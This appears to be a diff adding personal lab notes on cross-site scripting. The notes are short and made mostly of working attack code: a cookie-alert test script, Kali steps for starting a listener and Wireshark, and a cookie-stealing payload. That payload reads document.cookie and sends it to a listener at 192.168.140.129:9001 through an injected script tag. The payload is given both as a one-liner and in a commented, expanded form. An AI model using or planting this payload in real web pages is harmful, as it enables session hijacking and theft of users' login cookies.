@@ -1,0 +1,25 @@
+<script>let myCookie = document.cookie; alert(myCookie)</script>
+
+Kali command: 
+    python -m http.server
+    Open WireShark
+    
+Payload:
+<script>let myCookie = document.cookie;let data = { message: myCookie };let json = JSON.stringify(data);let script = document.createElement('script');script.src = `http://192.168.140.129:9001/?data=${encodeURIComponent(json)}`;document.head.appendChild(script);</script>
+Same as:
+    <script>
+        let myCookie = document.cookie;
+        let data = { message: myCookie };
+
+        // Convert the data to a JSON string
+        let json = JSON.stringify(data);
+
+        // Create a new script tag
+        let script = document.createElement('script');
+
+        // Set the source of the script tag to your server URL, including the data as a query parameter
+        script.src = `http://192.168.140.129:9001/?data=${encodeURIComponent(json)}`;
+
+        // Append the script tag to the head of the document to execute it
+        document.head.appendChild(script);
+    </script>
